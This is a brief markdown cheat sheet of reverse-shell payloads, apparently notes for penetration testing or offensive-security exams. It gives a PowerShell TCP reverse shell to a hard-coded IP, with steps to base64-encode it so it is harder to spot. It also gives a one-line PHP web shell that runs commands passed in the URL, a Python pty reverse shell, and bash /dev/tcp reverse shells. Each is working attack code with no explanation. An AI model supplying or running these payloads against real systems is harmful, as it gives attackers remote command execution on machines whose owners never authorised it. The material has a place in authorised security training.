# Shells

## Windows Powershell

```
$client = New-Object System.Net.Sockets.TCPClient("192.168.45.160",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**Base64 encoded**

```bash
PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 
```
```
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text) 
```
```
PS> $EncodedText =[Convert]::ToBase64String($Bytes)
```

## PHP

webshell
```
<?php system($_GET['cmd']); ?>
```

## Python

```
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

## Bash

```
bash -i >& /dev/tcp/192.168.1.1/80 0>&1

bash -c 'bash -i >& /dev/tcp/192.168.1.1/80 0>&1'
```